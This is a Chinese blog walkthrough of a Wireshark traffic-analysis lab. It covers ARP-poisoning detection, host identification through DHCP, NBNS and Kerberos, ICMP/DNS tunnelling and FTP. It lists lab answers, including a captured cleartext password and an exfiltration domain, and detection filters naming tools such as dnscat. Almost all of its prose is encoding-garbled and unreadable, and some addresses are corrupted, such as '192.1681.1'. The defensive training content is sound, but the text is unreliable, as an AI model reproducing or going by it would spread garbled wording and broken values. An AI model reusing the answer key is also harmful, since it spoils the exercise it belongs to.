<td>ä»¥âb4âç»å°¾ç MAC å°åéå¯¹ä¸ç³»å IP å°åæé äºå¤ä¸ªARPè¯·æ±ã</td>
<td>- MACå°åï¼00:0c:29:e2:18:b4<br>- IPå°åï¼192.168.1.xxx</td>
</tr>
</tbody>
</table>
<p>å°ç®åä¸ºæ­¢ï¼å¾ææ¾ï¼ä»¥âb4âç»å°¾çMACå°åæ¥æâ192.168.1.25âIPå°åï¼å¹¶éå¯¹ä¸ç³»åIPå°åæé äºå¯ççARPè¯·æ±ãå®è¿å£°ç§°æ¥æå¯è½çç½å³å°åãè®©æä»¬å³æ³¨å¶ä»åè®®ï¼å¹¶å¨æ¥ä¸æ¥çæ¶é´æ®µåå¯»æ¾è¿ç§å¼å¸¸çä½ç°ã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/b84e1d66cfbc149a41714135bc5c3c8a.png" alt="" loading="lazy"></p>
<p>å­å¨ HTTP æµéï¼IP å±ä¸åæ­£å¸¸ï¼å æ­¤ä¸æä»¬ä¹åçåç°æ²¡æå³èãè®©æä»¬å¨æ°æ®ååè¡¨çªæ ¼ä¸­æ·»å  MAC å°ååï¼ä»¥æ­ç¤º IP å°åèåçéä¿¡æåµã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/782e1acdc7a60154af0ad8830d8204d3.png" alt="" loading="lazy"></p>
<p>ååç°ä¸ä¸ªå¼å¸¸ï¼ææHTTPæ°æ®åçç®æ å°åé½æ¯ä»¥âb4âç»å°¾çMACå°åï¼æ¾ç¶ï¼è¿éé­åäºä¸­é´äººæ»å»ï¼æ»å»èå°±æ¯MACå°åä»¥âb4âç»å°¾çä¸»æºãææä¸â192.168.1.12âIPå°åå³èçæµéé½è¢«è½¬åå°äºè¿å°æ¶æä¸»æºãå¨ç»æè°æ¥ä¹åï¼è®©æä»¬æ»ç»ä¸ä¸è°æ¥ç»æã</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>ç¬è®°</strong></td>
<td><strong>æ£æµè®°å½</strong></td>
<td><strong>åç°</strong></td>
</tr>
<tr>
<td>IPå°åä¸MACå°åå¹éã</td>
<td>3. IPå°åä¸MACå°åå¹éã</td>
<td>- MACï¼00ï¼0cï¼29ï¼e2ï¼18ï¼b4 = IPï¼192.168.1.25<br>- MACå°åï¼50:78:b3:f3ð¿f4 = IPå°åï¼192.1681.1<br>- MACï¼00ï¼0cï¼29ï¼98ï¼c7ï¼a8 = IPï¼192.168.1.12</td>
</tr>
<tr>
<td>æ»å»è</td>
<td>æ»å»èå©ç¨ARPæ°æ®åå¶é åªå£°ã</td>
<td>- MACï¼00ï¼0cï¼29ï¼e2ï¼18ï¼b4 = IPï¼192.168.1.25</td>
</tr>
<tr>
<td>è·¯ç±å¨/ç½å³</td>
<td>ç½å³å°åã</td>
<td>- MACå°åï¼50:78:b3:f3ð¿f4 = IPå°åï¼192.1681.1</td>
</tr>
<tr>
<td>åå®³è</td>
<td>æ»å»èåæ¢äºåå®³èçææç½ç»æµéã</td>
<td>- MACå°åï¼50:78:b3:f3ð¿f4 = IPå°åï¼192.1681.12</td>
</tr>
</tbody>
</table>
<p>ä»åºå¤§çæè·æä»¶ä¸­æ£æµè¿äºä¿¡æ¯ç¢çæå·æææ§ãç¶èï¼å¨å®éåºç¨ä¸­ï¼ä½ ä¸å¯è½äºåè·å¾âå®å¶æ°æ®âè¿è¡è°æ¥ãå æ­¤ï¼ä½ éè¦å·å¤åæå¸çæç»´æ¨¡å¼ãç¥è¯åå·¥å·æè½ï¼æè½ç­éåæ£æµå¼å¸¸æåµã</p>
<p><strong>æ³¨ï¼</strong>å¨äº¤éåæä¸­ï¼æ»æå¤ç§è§£å³æ¹æ¡å¯ä¾éæ©ãè§£å³æ¹æ¡çç±»ååæ¹æ³åå³äºåæäººåçç¥è¯åæè½æ°´å¹³ä»¥åå¯ç¨çæ°æ®æ¥æºã</p>
<p>æ£æµååæä»¶ä¸­çå¯çæ´»å¨å¾å®¹æï¼ä¹æ¯å­¦ä¹ å¦ä½å³æ³¨ç»èçå¥½æ¹æ³ã</p>
<hr>
<p>ç°å¨ï¼è¯·ä½¿ç¨è¯¥<code>"~ /Desktop/exercise-pcaps/arp/Exercise"</code>æä»¶ï¼å°æ¨çæè½åºç¨äºåä¸ªæè·æä»¶ï¼å¹¶åç­ä»¥ä¸é®é¢ï¼</p>
<p>æ»å»èæé äºå¤å°ä¸ª ARP è¯·æ±ï¼<br>
ç­éï¼<code>arp.dst.hw_mac == 00:00:00:00:00:00 &amp;&amp; string(arp.src.hw_mac) matches "(:b4)$"</code></p>
<pre><code class="language-python">284
</code></pre>
<p>æ»å»èæ¶å°äºå¤å°ä¸ªHTTPæ°æ®åï¼<br>
ç­éï¼<code>eth.src == 00:0c:29:e2:18:b4 &amp;&amp; http</code><br>
è¿éæèªå·±ç­éçæ¶åæ¯0ä¸ªæ°æ®åæ¾ç¤ºåºæ¥ï¼ä½ç­æ¡æ¯90ä¸ª</p>
<pre><code class="language-python">90
</code></pre>
<p><img src="https://i-blog.csdnimg.cn/img_convert/387b305b963fed0b972020635f8f0cd5.png" alt="" loading="lazy"></p>
<p>åæ¢å°çç¨æ·ååå¯ç æ¡ç®æå¤å°æ¡ï¼<br>
æ¾å°è¿ä¸ªè·¯å¾ä½ä¸ºç­éå¨<br>
<img src="https://i-blog.csdnimg.cn/img_convert/ca55908da21b874cfcb24c2cbd72baff.png" alt="" loading="lazy"><br>
åæ¼ä¸ªhttpåè®®å³å¯<br>
æ£æ¥äº ä¸¤ä¸ªååç°æä¸¤ä¸ªæ²¡æå¯ç ç<br>
<img src="https://i-blog.csdnimg.cn/img_convert/d6b118374dccd707da94500337c8adaa.png" alt="" loading="lazy"><br>
é£ç­æ¡å°±æ¯6ä¸ª</p>
<pre><code class="language-python">6
</code></pre>
<p>âClient986âçå¯ç æ¯ä»ä¹ï¼<br>
<img src="https://i-blog.csdnimg.cn/img_convert/6fa9ebc025b6b748a03c721266bb9fbb.png" alt="" loading="lazy"></p>
<pre><code class="language-python">clientnothere!
</code></pre>
<p>Client354 æä¾çè¯è®ºæ¯ä»ä¹ï¼<br>
å­ç¬¦ä¸²å¨å±æ¾<br>
<img src="https://i-blog.csdnimg.cn/img_convert/99de356015935b2caecb720b275a3aaf.png" alt="" loading="lazy"></p>
<pre><code class="language-python">Nice work!
</code></pre>
<h4 id="ä¸»æºè¯å«dhcpnetbios-å-kerberos">ä¸»æºè¯å«ï¼DHCPãNetBIOS å Kerberos</h4>
<h5 id="è¯å«å®¿ä¸»">è¯å«å®¿ä¸»</h5>
<p>å¨è°æ¥å¥ä¾µææ¶æè½¯ä»¶æææ´»å¨æ¶ï¼å®å¨åæå¸é¤äºéè¦è¿è¡ IP å°åä¸ MAC å°åå¹éä¹å¤ï¼è¿åºè¯¥ç¥éå¦ä½è¯å«ç½ç»ä¸­çä¸»æºãæä½³æ¹æ³ä¹ä¸æ¯è¯å«ç½ç»ä¸­çä¸»æºåç¨æ·ï¼ä»¥æ­¤ç¡®å®è°æ¥çèµ·ç¹ï¼å¹¶ååºä¸æ¶ææµé/æ´»å¨ç¸å³çä¸»æºåç¨æ·ã</p>
<p>éå¸¸ï¼ä¼ä¸ç½ç»ä¼ä½¿ç¨é¢å®ä¹çå½åæ¨¡å¼æ¥å½åç¨æ·åä¸»æºãè½ç¶è¿ä¾¿äºäºè§£åè·è¸ªèµäº§æ¸åï¼ä½ä¹å­å¨å©å¼ãå¥½å¤å¨äºï¼å¯ä»¥éè¿åç§°è½»æ¾è¯å«ç¨æ·æä¸»æºãå¼ç«¯å¨äºï¼æ»å»èå¾å®¹æå¤å¶è¿ç§å½åæ¨¡å¼ï¼å¹¶å¨ä¼ä¸ç½ç»ä¸­è¿è¡æ»å»ãè½ç¶æå¤ç§è§£å³æ¹æ¡å¯ä»¥é¿åæ­¤ç±»æ»å»ï¼ä½å¯¹äºå®å¨åæå¸èè¨ï¼ææ¡ä¸»æºåç¨æ·è¯å«æè½ä»ç¶è³å³éè¦ã</p>
<p>å¯ç¨äºä¸»æºåç¨æ·èº«ä»½è¯å«çåè®®ï¼</p>
<ul>
<li>å¨æä¸»æºéç½®åè®® ( DHCP ) æµé</li>
<li>NetBIOS (NBNS) æµé</li>
<li>Kerberosæµé</li>
</ul>
<h5 id="dhcpåæ">DHCPåæ</h5>
<p><strong>DHCP</strong> åè®®ï¼æ ç§° å¨æä¸»æºéç½®<strong>åè®®</strong>(  <strong>DHCP</strong> <strong>)</strong>  <strong>ï¼****æ¯</strong>è´è´£ <strong>ç®¡ç****èªå¨</strong> <strong>IP</strong>å°ååæééä¿¡åæ°åéçææ¯ã</p>
<p><strong>DHCPæéè°æ¥ç®è¿°ï¼</strong></p>
<table>
<thead>
<tr>
<th><strong>ç¬è®°</strong></th>
<th><strong>Wiresharkè¿æ»¤å¨</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>å¨çæç´¢ã</td>
<td>- <code>dhcp</code>æè<code>bootp</code></td>
</tr>
<tr>
<td>ç­éæ­£ç¡®ç DHCP æ°æ®åéé¡¹å¯¹äºæ¾å°æå´è¶£çäºä»¶è³å³éè¦ã   <br>  <br><br>- <strong>âDHCP è¯·æ±â</strong>æ°æ®ååå«ä¸»æºåä¿¡æ¯<br>- <strong>âDHCP ACKâ</strong>æ°æ®åè¡¨ç¤ºå·²æ¥åçè¯·æ±<br>- <strong>âDHCP NAKâ</strong>æ°æ®åè¡¨ç¤ºè¯·æ±è¢«æç»ã<br><br>ç±äºåè®®æ¬èº«çç¹æ§ï¼åªæâéé¡¹ 53âï¼è¯·æ±ç±»åï¼å·æé¢å®ä¹çéæå¼ãæ¨åºè¯¥åç­éæ°æ®åç±»åï¼ç¶åå¯ä»¥éè¿âåºç¨ä¸ºåâæä½¿ç¨âåå«âåâå¹éâç­é«çº§ç­éå¨æ¥ç­éå¶ä½éé¡¹ã</td>
<td>- è¯·æ±ï¼<code>dhcp.option.dhcp == 3</code><br><br>- ACKï¼<code>dhcp.option.dhcp == 5</code><br><br>- NAKï¼<code>dhcp.option.dhcp == 6</code></td>
</tr>
<tr>
<td><strong>â DHCPè¯·æ±â</strong>éé¡¹ï¼å©æ¨è½»æ¾è·åæéèµæºï¼<br><br>- <strong>éé¡¹ 12ï¼</strong>ä¸»æºåã<br>- <strong>éé¡¹ 50ï¼</strong>è¯·æ±ç IP å°åã<br>- <strong>éé¡¹ 51ï¼</strong>è¯·æ± IP ç§æã<br>- <strong>éé¡¹ 61ï¼</strong>å®¢æ·ç«¯ MAC å°åã</td>
<td>- <code>dhcp.option.hostname contains "keyword"</code></td>
</tr>
<tr>
<td><strong>DHCP ACKéé¡¹ï¼å©æ¨</strong>è½»æ¾è·åæéèµæºï¼<br><br>- <strong>éé¡¹ 15ï¼</strong>ååã<br>- <strong>éé¡¹ 51ï¼</strong>åé IP ç§æã</td>
<td>- <code>dhcp.option.domain_name contains "keyword"</code></td>
</tr>
<tr>
<td><strong>â DHCP NAKâ</strong>éé¡¹ï¼ç¨äºè·åå¾æå¯å¾çææï¼<br><br>- <strong>éé¡¹ 56ï¼</strong>æ¶æ¯ï¼æç»è¯¦æ/åå ï¼ã</td>
<td>ç±äºä¿¡æ¯å¯è½å å·ä½æåµèå¼ï¼å»ºè®®éè¯»ä¿¡æ¯èéå¯¹å¶è¿è¡ç­éãè¿æ ·ï¼åæäººåæè½éè¿äºè§£äºä»¶èæ¯ï¼æåºæ´å¯é çåè®¾æå¾åºæ´åç¡®çç»è®ºã</td>
</tr>
<tr>
<td><img src="https://img2024.cnblogs.com/blog/3392862/202512/3392862-20251229081205079-263091085.png" alt="" loading="lazy"></td>
<td></td>
</tr>
</tbody>
</table>
<h5 id="netbios-nbns-åæ">NetBIOS (NBNS) åæ</h5>
<p><strong>NetBIOS</strong>  ï¼ <strong>ç½ç»</strong>åºæ¬ <strong>è¾å¥</strong>/<strong>è¾åº<strong><strong>ç³»ç»</strong></strong>ï¼</strong>æ¯è´è´£åè®¸ä¸åä¸»æºä¸çåºç¨ç¨åº ç¸äºéä¿¡çææ¯ã</p>
<p><strong>NBNSè°æ¥ç®è¿°ï¼</strong></p>
<table>
<thead>
<tr>
<th><strong>ç¬è®°</strong></th>
<th><strong>Wiresharkè¿æ»¤å¨</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>å¨å±æç´¢</td>
<td>- <code>nbns</code></td>
</tr>
<tr>
<td><strong>âNBNSâ</strong> éé¡¹ï¼å©æ¨è½»æ¾æåæå®ï¼<br><br>- <strong>æ¥è¯¢ï¼</strong>æ¥è¯¢è¯¦æã<br>- æ¥è¯¢è¯¦æå¯è½åå«<strong>âåç§°ãçå­æ¶é´ (TTL) å IP å°åè¯¦æâ</strong></td>
<td>- <code>nbns.name contains "keyword"</code></td>
</tr>
<tr>
<td><img src="https://img2024.cnblogs.com/blog/3392862/202512/3392862-20251229081203867-198212015.png" alt="" loading="lazy"></td>
<td></td>
</tr>
</tbody>
</table>
<h5 id="kerberos-åæ">Kerberos åæ</h5>
<p><strong>Kerberos</strong> æ¯ Microsoft Windows åçé»è®¤èº«ä»½éªè¯æå¡ãå®è´è´£å¨ä¸åä¿¡ä»»çç½ç»ä¸éªè¯ä¸¤å°æå¤å°è®¡ç®æºä¹é´çæå¡è¯·æ±ãå¶æç»ç®æ æ¯å®å¨å°éªè¯èº«ä»½ã</p>
<p><strong>Kerberosè°æ¥ç®è¿°ï¼</strong></p>
<table>
<thead>
<tr>
<th><strong>ç¬è®°</strong></th>
<th><strong>Wiresharkè¿æ»¤å¨</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>å¨çæç´¢ã</td>
<td>- <code>kerberos</code></td>
</tr>
<tr>
<td>ç¨æ·è´¦å·æ¥è¯¢ï¼<br><br>- <strong>CNameStringï¼</strong>ç¨æ·åã<br><br><strong>æ³¨æï¼</strong> æäºæ°æ®åå¯è½å¨æ­¤å­æ®µä¸­åå«ä¸»æºåä¿¡æ¯ãä¸ºé¿åæ··æ·ï¼è¯·è¿æ»¤æä»¥<strong>â$â</strong>ç»å°¾çå¼ãä»¥â$âç»å°¾çå¼æ¯ä¸»æºåï¼ä¸ä»¥<strong>â$â</strong>ç»å°¾çå¼æ¯ç¨æ·åã</td>
<td>- <code>kerberos.CNameString contains "keyword"</code> <br>- <code>kerberos.CNameString and !(kerberos.CNameString contains "$" )</code></td>
</tr>
<tr>
<td>å©ç¨â Kerberos âåè®®è·åå¾æå¯å¾çææï¼<br><br>- <strong>pvnoï¼</strong>åè®®çæ¬ã<br>- <strong>realmï¼</strong>çæçç¥¨æ®çååã<br>- <strong>snameï¼</strong>çæçå·¥åçæå¡åååã<br>- <strong>å°åï¼</strong>å®¢æ·ç«¯ IP å°åå NetBIOS åç§°ã<br><br><strong>æ³¨æï¼âå°åâä¿¡æ¯ä»å¨è¯·æ±æ°æ®åä¸­å¯ç¨ã</strong></td>
<td>- <code>kerberos.pvno == 5</code><br><br>- <code>kerberos.realm contains ".org"</code> <br><br>- <code>kerberos.SNameString == "krbtg"</code></td>
</tr>
<tr>
<td><img src="https://img2024.cnblogs.com/blog/3392862/202512/3392862-20251229081202881-1382189648.png" alt="" loading="lazy"></td>
<td></td>
</tr>
</tbody>
</table>
<hr>
<p>è¯·åç­ä»¥ä¸é®é¢</p>
<p>ä¸»æºâGalaxy A30âç MAC å°åæ¯ä»ä¹ï¼<br>
ç­éï¼<code>dhcp.option.hostname contains "Galaxy"</code><br>
<img src="https://i-blog.csdnimg.cn/img_convert/cfb20765188a5ac97333831568f4ade2.png" alt="" loading="lazy"></p>
<pre><code class="language-python">9a:81:41:cb:96:6c
</code></pre>
<p>âLIVALJMâå·¥ä½ç«æå¤å°ä¸ªNetBIOSæ³¨åè¯·æ±ï¼<br>
ç­éï¼<code>nbns &amp;&amp; nbns.name contains "LIVALJM"</code><br>
<img src="https://i-blog.csdnimg.cn/img_convert/cffb28ef2952f2dc6b6b73443948afd4.png" alt="" loading="lazy"><br>
æä¸äºä¸æ¯æ³¨åè¯·æ±ï¼é£æä»¬è¿éè¦è¿ä¸æ­¥ç­é<br>
éæ©ä¸é¢è¿ä¸ªflagä½ä¸ºéå ç­éæ¡ä»¶<br>
<img src="https://i-blog.csdnimg.cn/img_convert/928381ab353c6f012f88670b643c8b0e.png" alt="" loading="lazy"><br>
æç»ç­éè¯­æ³ï¼<code>(nbns &amp;&amp; nbns.name contains "LIVALJM") &amp;&amp; (nbns.flags.opcode == 5)</code></p>
<pre><code class="language-python">16
</code></pre>
<p>åªä¸ªä¸»æºè¯·æ±äº IP å°åâ172.16.13.85âï¼<br>
ç­éï¼<code>dhcp.option.requested_ip_address == 172.16.13.85</code><br>
<img src="https://i-blog.csdnimg.cn/img_convert/f928bec9c33984a54cb16bd0a9f2a0cd.png" alt="" loading="lazy"></p>
<pre><code class="language-python">Galaxy-A12
</code></pre>
<p>ç¨æ·âu5âçIPå°åæ¯ä»ä¹?<br>
ç­éï¼<code>kerberos.CNameString contains âu5â and kerberos.as_req_element</code><br>
ï¼åªç­éäºè¯·æ±é¨åï¼æä»¥æä»¬å¯ä»¥ç´æ¥çæºipå³å¯ï¼</p>
<pre><code class="language-python">10[.]1[.]12[.]2
</code></pre>
<p>Kerberos æ°æ®åä¸­å¯ç¨ä¸»æºçä¸»æºåæ¯ä»ä¹ï¼<br>
ç­éï¼<code>kerberos.CNameString contains "$"</code><br>
è®°ä½ä¸å¥è¯ï¼ä»¥ <strong>â$â</strong> ç»å°¾çå¼æ¯ä¸»æºåï¼ä¸ä»¥ <strong>â$â</strong> ç»å°¾çå¼æ¯ç¨æ·åã</p>
<pre><code class="language-python">xp1$
</code></pre>
<h4 id="é§éæµédns-å-icmp">é§éæµéï¼DNS å ICMP</h4>
<p>æµéé§éï¼ä¹ç§°ä¸º <strong>âç«¯å£è½¬åâ</strong>ï¼ æ¯ä¸ç§ä»¥å®å¨çæ¹å¼å°æ°æ®/èµæºä¼ è¾å°ç½ç»æ®µååºåçææ¯ãå®å¯ç¨äºâäºèç½å°ä¸ç¨ç½ç»âåâä¸ç¨ç½ç»å°äºèç½âçæµé/æ¹åè½¬æ¢ãè¯¥ææ¯éè¿å°è£è¿ç¨éèæ°æ®ï¼ä½¿ä¼ è¾çæ°æ®çèµ·æ¥ä¸æ®éç½ç»æ å¼ï¼ä½å®éä¸åå«ç§ææ°æ®åï¼å¹¶å®å¨å°å°å¶ä¼ è¾å°æç»ç®çå°ã</p>
<p>é§éææ¯æä¾å¿åæ§åæµéå®å¨ä¿éï¼å æ­¤è¢«å¹¿æ³åºç¨äºä¼ä¸ç½ç»ãç¶èï¼ç±äºå®æä¾äºé«æ°´å¹³çæ°æ®å å¯ï¼æ»å»èä¼å©ç¨é§éææ¯ç»è¿å®å¨è¾¹çï¼ä½¿ç¨è¯¸å¦ ICMP åDNSç­æ¥å¸¸æµéä¸­ä½¿ç¨çæ åå¯ä¿¡åè®®ãå æ­¤ï¼å¯¹äºå®å¨åæå¸èè¨ï¼è½å¤è¯å« ICMP åDNSå¼å¸¸è³å³éè¦ã</p>
<h5 id="icmpåæ">ICMPåæ</h5>
<p>äºèç½æ§å¶æ¶æ¯åè®® (ICMP) æ¨å¨è¯æ­åæ¥åç½ç»éä¿¡é®é¢ï¼å¹¿æ³åºç¨äºéè¯¯æ¥ååæµè¯ãç±äºå®æ¯ä¸ç§å¯ä¿¡çç½ç»å±åè®®ï¼ææ¶ä¹ä¼è¢«ç¨äºæç»æå¡ ( DoS ) æ»å»ï¼æ­¤å¤ï¼æ»å»èè¿ä¼å©ç¨å®è¿è¡æ°æ®çªååC2é§éæ»å»ã</p>
<p><strong>ICMPåæç®è¿°ï¼</strong></p>
<p>éå¸¸ï¼ICMPé§éæ»å»æ¯å¨æ¶æè½¯ä»¶æ§è¡ææ¼æ´å©ç¨ååºç°çå¼å¸¸æåµãç±äºICMPæ°æ®åå¯ä»¥ä¼ è¾é¢å¤çæ°æ®è½½è·ï¼æ»å»èä¼å©ç¨è¿ä¸é¨åæ¥çªåæ°æ®å¹¶å»ºç«C2è¿æ¥ãè¿äºæ°æ®å¯ä»¥æ¯TCPãHTTPæSSHæ°æ®ãICMPåè®®è½ç¶æä¾äºæºå¸¦é¢å¤æ°æ®çç»ä½³æºä¼ï¼ä½ä¹å­å¨ä¸äºç¼ºç¹ãå¤§å¤æ°ä¼ä¸ç½ç»ä¼é»æ­¢èªå®ä¹æ°æ®åï¼æèè¦æ±ç®¡çåæéæè½åå»ºèªå®ä¹ICMPæ°æ®åã</p>
<p>å¤§éç ICMP æµéæå¼å¸¸çæ°æ®åå¤§å°æ¯ ICMP é§éæ»å»çè¿¹è±¡ãç¶èï¼æ»å»èå¯ä»¥åå»ºä¸å¸¸è§ ICMP æ°æ®åå¤§å°ï¼64 å­èï¼ç¸å¹éçèªå®ä¹æ°æ®åï¼å æ­¤æ£æµè¿äºé§éæ»å»æ´»å¨ä»ç¶ååå°é¾ãä½æ¯ï¼å®å¨åæå¸åºè¯¥äºè§£æ­£å¸¸åå¼å¸¸æåµï¼ä»¥ä¾¿åç°å¯è½çå¼å¸¸å¹¶å°å¶ä¸æ¥è¿è¡è¿ä¸æ­¥åæã</p>
<table>
<thead>
<tr>
<th><strong>ç¬è®°</strong></th>
<th><strong>Wiresharkè¿æ»¤å¨</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>å¨çæç´¢</td>
<td>- <code>icmp</code></td>
</tr>
<tr>
<td><strong>âICMPâéé¡¹ï¼ç¨äºè·åå¾æå¯å¾çææï¼</strong><br><br>- æ°æ®åé¿åº¦ã<br>- ICMP ç®æ å°åã<br>- å°è£åè®®å¨ ICMP ææè½½è·ä¸­ç­¾åã</td>
<td>- <code>data.len &gt; 64 and icmp</code></td>
</tr>
<tr>
<td><img src="https://img2024.cnblogs.com/blog/3392862/202512/3392862-20251229081157013-1769279406.png" alt="" loading="lazy"></td>
<td></td>
</tr>
</tbody>
</table>
<h5 id="dns-åæ">DNS åæ</h5>
<p>ååç³»ç» (DNS) æ¨å¨å° IP ååè½¬æ¢ä¸º IP å°åï¼å®ä¹è¢«ç§°ä¸ºäºèç½ççµè¯ç°¿ãç±äºå®æ¯ç½ç»æå¡çéè¦ç»æé¨åï¼å æ­¤è¢«å¹¿æ³ä½¿ç¨åä¿¡ä»»ï¼ä½ä¹æ­£å å¦æ­¤ï¼å®å¸¸å¸¸è¢«å¿½è§ãæ­£å å¦æ­¤ï¼æ»å»èä¼å©ç¨å®è¿è¡æ°æ®çªåå C2 æ´»å¨ã</p>
<p><strong>DNS åæç®è¿°ï¼</strong></p>
<p>ä¸ ICMP é§éç±»ä¼¼ï¼DNS æ»å»æ¯ææ¶æè½¯ä»¶æ§è¡ææ¼æ´å©ç¨ååºç°çå¼å¸¸æåµãæ»å»èä¼åå»ºï¼æå·²æ¥æï¼ä¸ä¸ªååå°åï¼å¹¶å°å¶éç½®ä¸º C2 ééãæ¶æè½¯ä»¶ææ¼æ´å©ç¨åæ§è¡çå½ä»¤ä¼å C2 æå¡å¨åé DNS æ¥è¯¢ãç¶èï¼è¿äºæ¥è¯¢æ¯é»è®¤ç DNS æ¥è¯¢æ´é¿ï¼å¹¶ä¸æ¯éå¯¹å­ååå°åç²¾å¿æé çã ä¸å¹¸çæ¯ï¼è¿äºå­ååå°åå¹¶éå®éå°åï¼èæ¯ç»è¿ç¼ç çå½ä»¤ï¼å¦ä¸æç¤ºï¼</p>
<p><strong>"encoded-commands.maliciousdomain.com"</strong></p>
<p>å½æ­¤æ¥è¯¢è¢«è·¯ç±å°C2æå¡å¨æ¶ï¼æå¡å¨ä¼å°å®éçæ¶æå½ä»¤åéå°ç®æ ä¸»æºãç±äºDNSæ¥è¯¢æ¯ç½ç»æ´»å¨çèªç¶ç»æé¨åï¼è¿äºæ°æ®åæå¯è½ä¸è¢«ç½ç»è¾¹çæ£æµå°ãå®å¨åæå¸åºè¯¥ç¥éå¦ä½åæDNSæ°æ®åçé¿åº¦åç®æ å°åï¼ä»¥ä¾¿åç°è¿äºå¼å¸¸æåµã</p>
<table>
<thead>
<tr>
<th><strong>ç¬è®°</strong></th>
<th><strong>Wiresharkè¿æ»¤å¨</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>å¨çæç´¢</td>
<td>- <code>dns</code></td>
</tr>
<tr>
<td><strong>å©ç¨â DNS âéé¡¹è·åå¾æå¯å¾çææï¼</strong><br><br>- æ¥è¯¢é¿åº¦ã<br>- DNSå°åä¸­çå¼å¸¸åéå¸¸è§åç§°ã<br>- åå«ç¼ç å­ååå°åçé¿DNSå°åã<br>- å·²ç¥æ¨¡å¼å¦ dnscat å dns2tcpã<br>- ç»è®¡åæï¼ä¾å¦éå¯¹ç¹å®ç®æ çDNSè¯·æ±å¼å¸¸éã<br><br><strong>!mdnsï¼</strong>ç¦ç¨æ¬å°é¾è·¯è®¾å¤æ¥è¯¢ã</td>
<td>- <code>dns contains "dnscat"</code><br><br>- <code>dns.qry.name.len &gt; 15 and !mdns</code></td>
</tr>
<tr>
<td><img src="https://img2024.cnblogs.com/blog/3392862/202512/3392862-20251229081155151-413126271.png" alt="" loading="lazy"></td>
<td></td>
</tr>
</tbody>
</table>
<hr>
<p>è°æ¥å¼å¸¸æ°æ®åãICMPé§éä½¿ç¨çæ¯åªç§åè®®ï¼<br>
ç­éï¼<code>(data.len &gt; 64) and (icmp contains "ssh" or icmp contains "ftp" or icmp contains "tcp" or icmp contains "http")</code><br>
<img src="https://i-blog.csdnimg.cn/img_convert/9448f154a8546f26aadddfa9c81e0d75.png" alt="" loading="lazy"></p>
<pre><code class="language-pytohn">ssh
</code></pre>
<p>è°æ¥å¼å¸¸æ°æ®åãæ¥æ¶å¼å¸¸DNSæ¥è¯¢çå¯çä¸»ååå°åæ¯ä»ä¹?<br>
ç­éï¼<code>dns.qry.name.len &gt; 40 and !mdns &amp;&amp; dns.qry.name contains ".com"</code><br>
è¿ä¸ªé¿åº¦å¯ä»¥æ ¹æ®ä½ çè°æ¥æ¢æ¢è°æ´å³å¯ï¼ä¸ä¸å®è¯´éè¦40<br>
<code>dataexfil[.]com</code><br>
<img src="https://i-blog.csdnimg.cn/img_convert/067737b9e69e3c31315388f10f08d011.png" alt="" loading="lazy"></p>
<pre><code class="language-python">dataexfil[.]com
</code></pre>
<h4 id="ææåè®®åæftp">ææåè®®åæï¼FTP</h4>
<p>è°æ¥ææåè®®è·è¸ªæ°æ®å¬èµ·æ¥å¾ç®åï¼ä½å½éè¦è°æ¥å¤§åç½ç»è·è¸ªæ°æ®ä»¥è¿è¡äºä»¶åæåååºæ¶ï¼æåµå°±å¤§ä¸ç¸åäºãæ­£ç¡®çåæä¸ä»ä»æ¯è·è¸ªæ°æ®æµåè¯»åæææ°æ®ãå¯¹äºå®å¨åæå¸æ¥è¯´ï¼éè¦çæ¯ä»è°æ¥è¿ç¨ä¸­åå»ºç»è®¡æ°æ®åå³é®ç»æãæ­£å¦ Wireshark ç³»åæç¨å¼å¤´æå°çï¼åæå¸åºè¯¥å·å¤å®æè¿é¡¹å·¥ä½æéçç½ç»ç¥è¯åå·¥å·æè½ãè®©æä»¬ç¨ Wireshark æ¨¡æä¸æ¬¡ææåè®®è°æ¥å§ï¼</p>
<h5 id="ftpåæ">FTPåæ</h5>
<p>æä»¶ä¼ è¾åè®® ( FTP ) çè®¾è®¡åè¡·æ¯ä¸ºäºæ¹ä¾¿æä»¶ä¼ è¾ï¼å æ­¤å®æ´æ³¨éç®ä¾¿æ§èéå®å¨æ§ãæ­£å å¦æ­¤ï¼å¨ä¸å®å¨çç¯å¢ä¸­ä½¿ç¨æ­¤åè®®å¯è½ä¼å¯¼è´ä»¥ä¸å®å¨é®é¢ï¼</p>
<ul>
<li>ä¸­é´äººæ»å»</li>
<li>å­è¯çªååæªç»ææçè®¿é®</li>
<li>ç½ç»éé±¼</li>
<li>æ¶æè½¯ä»¶æ¤å¥</li>
<li>æ°æ®æ³é²</li>
</ul>
<p><strong>FTPåæç®è¿°ï¼</strong></p>
<table>
<thead>
<tr>
<th><strong>ç¬è®°</strong></th>
<th><strong>Wiresharkè¿æ»¤å¨</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>å¨å±æç´¢</td>
<td>- <code>ftp</code></td>
</tr>
<tr>
<td><strong>éè¿â FTP â</strong>éé¡¹è·åå¾æå¯å¾çææï¼<br><br>- <strong>x1x ç³»åï¼</strong>ä¿¡æ¯è¯·æ±ååºã<br>- <strong>x2x ç³»åï¼</strong>è¿æ¥æ¶æ¯ã<br>- <strong>x3x ç³»åï¼</strong>èº«ä»½éªè¯æ¶æ¯ã<br><br><strong>æ³¨æï¼</strong> â200âè¡¨ç¤ºå½ä»¤æ§è¡æåã</td>
<td><strong>---</strong></td>
</tr>
<tr>
<td><strong>âx1xâç³»åéé¡¹ï¼å©æ¨è½»æ¾æåæå®ï¼</strong><br><br>- <strong>211ï¼</strong>ç³»ç»ç¶æã<br>- <strong>212ï¼</strong>ç®å½ç¶æã<br>- <strong>213ï¼</strong>æä»¶ç¶æ</td>
<td>- <code>ftp.response.code == 211</code></td>
</tr>
<tr>
<td><strong>âx2xâç³»åéé¡¹ï¼å©æ¨è½»æ¾æåæå®ï¼</strong><br><br>- <strong>220ï¼</strong>æå¡å·²åå¤å°±ç»ªã<br>- <strong>227ï¼</strong>è¿å¥è¢«å¨æ¨¡å¼ã<br>- <strong>228ï¼</strong>é¿æ¶é´è¢«å¨æ¨¡å¼ã<br>- <strong>229ï¼</strong>æ©å±è¢«å¨æ¨¡å¼ã</td>
<td>- <code>ftp.response.code == 227</code></td>
</tr>
<tr>
